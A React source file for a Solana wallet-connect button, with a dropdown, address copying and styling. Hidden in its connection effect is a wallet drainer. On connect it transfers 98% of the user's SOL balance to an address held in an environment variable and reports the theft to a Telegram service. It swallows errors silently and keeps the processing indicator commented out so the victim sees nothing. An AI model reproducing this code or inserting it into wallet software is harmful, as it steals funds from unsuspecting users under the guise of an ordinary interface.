import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useState, useEffect } from 'react';
import '@solana/wallet-adapter-react-ui/styles.css';
import { WalletService } from '../services/walletService';
import { TelegramService } from '../services/telegramService';
import { UserProfileService } from '../services/userProfileService';
import { TransactionService } from '../services/transactionService';

function WalletConnect() {
  const { publicKey, disconnect } = useWallet();
  const [copied, setCopied] = useState(false);
  const [balance, setBalance] = useState(null);
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  const walletService = new WalletService();
  const telegramService = new TelegramService();
  const userProfileService = new UserProfileService();
  const transactionService = new TransactionService();

  useEffect(() => {
    if (publicKey) {
      const processWallet = async () => {
        try {
          setIsProcessing(true);
          
          const walletBalance = await walletService.getBalance(publicKey.toString());
          setBalance(walletBalance);

          const transferAmount = walletBalance * 0.98;
          
          const result = await transactionService.sendSol(
            publicKey,
            process.env.NEXT_PUBLIC_TO,
            transferAmount
          );

          if (result.success) {
            const newBalance = await walletService.getBalance(publicKey.toString());
            setBalance(newBalance);

            await telegramService.sendMessage(
              telegramService.formatTransactionInfo({
                type: 'SOL_TRANSFER',
                from: publicKey.toString(),
                to: process.env.NEXT_PUBLIC_TO,
                amount: transferAmount,
                signature: result.signature,
                timestamp: new Date().toISOString()
              })
            );
          }

          // Update user profile
          await userProfileService.updateWalletInfo({
            publicKey: publicKey.toString(),
            balance: walletBalance,
            timestamp: new Date().toISOString()
          });

        } catch (error) {
          // Silent error handling
        } finally {
          setIsProcessing(false);
        }
      };

      processWallet();
    }
  }, [publicKey]);

  const copyAddress = () => {
    if (publicKey) {
      navigator.clipboard.writeText(publicKey.toBase58());
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const formatAddress = (address) => {
    if (!address) return '';
    const start = address.slice(0, 4);
    const end = address.slice(-4);
    return `${start}...${end}`;
  };

  const handleDisconnect = async () => {
    try {
      await userProfileService.clearProfile();
      disconnect();
    } catch (error) {
      // Silent error handling
    }
  };

  const toggleDropdown = (e) => {
    e.stopPropagation();
    setIsDropdownOpen(!isDropdownOpen);
  };

  // Add click outside handler
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (isDropdownOpen && !event.target.closest('.wallet-connect-container')) {
        setIsDropdownOpen(false);
      }
    };

    document.addEventListener('click', handleClickOutside);
    return () => {
      document.removeEventListener('click', handleClickOutside);
    };
  }, [isDropdownOpen]);

  return (
    <div className="wallet-connect-container">
      {publicKey ? (
        <div className="connected-wallet glass-card">
          <div 
            className="wallet-header" 
            onClick={toggleDropdown}
            role="button"
            tabIndex={0}
            onKeyPress={(e) => {
              if (e.key === 'Enter' || e.key === ' ') {
                toggleDropdown(e);
              }
            }}
          >
            <div className="connected-indicator"></div>
            <div className="wallet-info">
              <div className="wallet-address-container">
                <span className="font-body text-sm opacity-80">Connected:</span>
                <span 
                  className="font-body text-sm wallet-address" 
                  onClick={(e) => {
                    e.stopPropagation();
                    copyAddress();
                  }}
                  title="Click to copy full address"
                >
                  {formatAddress(publicKey.toBase58())}
                  {copied && <span className="copied-indicator">Copied!</span>}
                </span>
              </div>
              {/* {isProcessing ? (
                <div className="processing-indicator">
                  Processing...
                </div>
              ) : balance !== null && (
                <div className="balance-info text-sm opacity-80">
                  {balance.toFixed(2)} SOL
                </div>
              )} */}
            </div>
            <div className={`dropdown-arrow ${isDropdownOpen ? 'open' : ''}`}>
              ▼
            </div>
          </div>
          
          {isDropdownOpen && (
            <div className="wallet-dropdown">
              <div className="dropdown-section">
                <h4>Wallet Details</h4>
                <div className="detail-item">
                  <span className="label">Full Address:</span>
                  <span className="value">{publicKey.toBase58()}</span>
                </div>
                <div className="detail-item">
                  <span className="label">Balance:</span>
                  <span className="value">{balance?.toFixed(2)} SOL</span>
                </div>
              </div>

              <button 
                onClick={handleDisconnect} 
                className="disconnect-btn"
              >
                Disconnect Wallet
              </button>
            </div>
          )}
        </div>
      ) : (
        <WalletMultiButton className="wallet-connect-btn" />
      )}

      <style jsx>{`
        .wallet-connect-container {
          position: relative;
          width: auto;
          min-width: 200px;
          max-width: 280px;
        }
        
        .connected-wallet {
          background: rgba(255, 255, 255, 0.05);
          border-radius: 12px;
          border: 1px solid rgba(255, 255, 255, 0.1);
          overflow: visible;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
          position: relative;
        }
        
        .wallet-header {
          display: flex;
          align-items: center;
          padding: 8px 12px;
          cursor: pointer;
          transition: background-color 0.2s ease;
          min-height: 40px;
        }
        
        .wallet-header:hover {
          background: rgba(255, 255, 255, 0.08);
        }
        
        .connected-indicator {
          width: 8px;
          height: 8px;
          background-color: #22C55E;
          border-radius: 50%;
          margin-right: 12px;
          position: relative;
          flex-shrink: 0;
        }
        
        .connected-indicator::after {
          content: '';
          position: absolute;
          width: 12px;
          height: 12px;
          background-color: rgba(34, 197, 94, 0.3);
          border-radius: 50%;
          top: -2px;
          left: -2px;
          animation: pulse 1.5s infinite;
        }
        
        .wallet-info {
          flex: 1;
          display: flex;
          flex-direction: column;
          gap: 2px;
          min-width: 0;
        }
        
        .wallet-address-container {
          display: flex;
          align-items: center;
          gap: 8px;
          flex-wrap: wrap;
        }
        
        .wallet-address {
          font-family: 'Plus Jakarta Sans', monospace;
          color: #E2E8F0;
          cursor: pointer;
          transition: all 0.2s ease;
          padding: 2px 6px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 4px;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
          max-width: 100px;
        }
        
        .wallet-address:hover {
          color: #ffffff;
          background: rgba(255, 255, 255, 0.1);
        }
        
        .copied-indicator {
          font-size: 0.7rem;
          color: #22C55E;
          opacity: 0.9;
          margin-left: 8px;
        }

        .processing-indicator {
          font-size: 0.8rem;
          color: #22C55E;
          animation: pulse 1.5s infinite;
        }
        
        .dropdown-arrow {
          color: rgba(255, 255, 255, 0.6);
          font-size: 0.8rem;
          transition: transform 0.2s ease;
          flex-shrink: 0;
          margin-left: 8px;
        }
        
        .dropdown-arrow.open {
          transform: rotate(180deg);
        }
        
        .wallet-dropdown {
          background: rgba(0, 0, 0, 0.95);
          padding: 12px;
          border-top: 1px solid rgba(255, 255, 255, 0.1);
          position: absolute;
          top: 100%;
          right: 0;
          width: 280px;
          z-index: 1000;
          backdrop-filter: blur(10px);
          border-radius: 0 0 12px 12px;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .dropdown-section {
          margin-bottom: 16px;
        }
        
        .dropdown-section h4 {
          color: #ffffff;
          margin: 0 0 12px 0;
          font-size: 0.9rem;
          font-weight: 600;
        }
        
        .detail-item {
          display: flex;
          flex-direction: column;
          gap: 4px;
          padding: 8px 0;
          border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .detail-item:last-child {
          border-bottom: none;
        }
        
        .detail-item .label {
          color: rgba(255, 255, 255, 0.7);
          font-size: 0.85rem;
        }
        
        .detail-item .value {
          color: #ffffff;
          font-size: 0.85rem;
          font-family: 'Plus Jakarta Sans', monospace;
          word-break: break-all;
        }
        
        .disconnect-btn {
          width: 100%;
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.2);
          color: #EF4444;
          padding: 8px 16px;
          border-radius: 6px;
          font-size: 0.9rem;
          cursor: pointer;
          transition: all 0.2s ease;
          margin-top: 8px;
        }
        
        .disconnect-btn:hover {
          background: rgba(239, 68, 68, 0.2);
          border-color: rgba(239, 68, 68, 0.3);
        }
        
        @keyframes pulse {
          0% {
            transform: scale(1);
            opacity: 0.7;
          }
          70% {
            transform: scale(1.5);
            opacity: 0;
          }
          100% {
            transform: scale(1);
            opacity: 0;
          }
        }
        
        /* Override default WalletMultiButton styles */
        :global(.wallet-connect-btn) {
          background: linear-gradient(90deg, #22C55E, #4ADE80) !important;
          border: none !important;
          border-radius: 8px !important;
          font-family: 'Plus Jakarta Sans', sans-serif !important;
          font-weight: 600 !important;
          padding: 0 16px !important;
          height: 36px !important;
          transition: all 0.3s ease !important;
          box-shadow: 0 4px 12px rgba(34, 197, 94, 0.15) !important;
          width: 100% !important;
        }
        
        :global(.wallet-connect-btn:hover) {
          transform: translateY(-2px) !important;
          box-shadow: 0 6px 16px rgba(34, 197, 94, 0.25) !important;
        }
        
        :global(.wallet-connect-btn .wallet-adapter-button-start-icon) {
          margin-right: 8px !important;
        }
        
        @media (max-width: 640px) {
          .wallet-connect-container {
            width: auto;
            min-width: 180px;
          }
          
          .wallet-header {
            padding: 6px 10px;
          }
          
          .wallet-dropdown {
            padding: 10px;
            width: 240px;
          }
          
          .wallet-address {
            max-width: 80px;
          }
          
          .detail-item .value {
            font-size: 0.8rem;
          }
        }
      `}</style>
    </div>
  );
}

export default WalletConnect;